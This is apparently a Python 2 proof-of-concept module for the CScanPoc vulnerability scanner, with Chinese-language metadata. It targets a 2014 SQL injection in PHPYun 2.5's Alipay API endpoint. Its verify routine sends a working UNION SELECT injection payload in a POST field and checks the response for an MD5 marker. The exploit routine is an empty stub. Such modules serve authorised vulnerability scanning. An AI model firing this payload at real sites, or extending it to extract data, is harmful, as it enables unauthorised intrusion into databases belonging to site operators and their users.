# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = '10d2ce0c-1bc7-45b0-8876-8a0ad8fe8553'
    name = 'PHPYun 2.5 /api/alipay/alipayto.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-06-10'  # 漏洞公布时间
    desc = '''
        PHPYun 2.5 在 /api/alipay/alipayto.php 中，提交POST[dingdan]参数存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-62513'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPYun'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '37dc611c-d805-4871-93c4-accd8fbbef7e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            verify_url = self.target + '/api/alipay/alipayto.php'
            post_content = r'''dingdan=123' and 1=2 UNION SELECT 1,2,3,4,md5('usakiller'),6,7,8,9,10,11,12 %23'''
            req = urllib2.Request(verify_url, post_content)
            content = urllib2.urlopen(req).read()
            
            if '5858f22c2c4fddb92961c716601b01c1' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
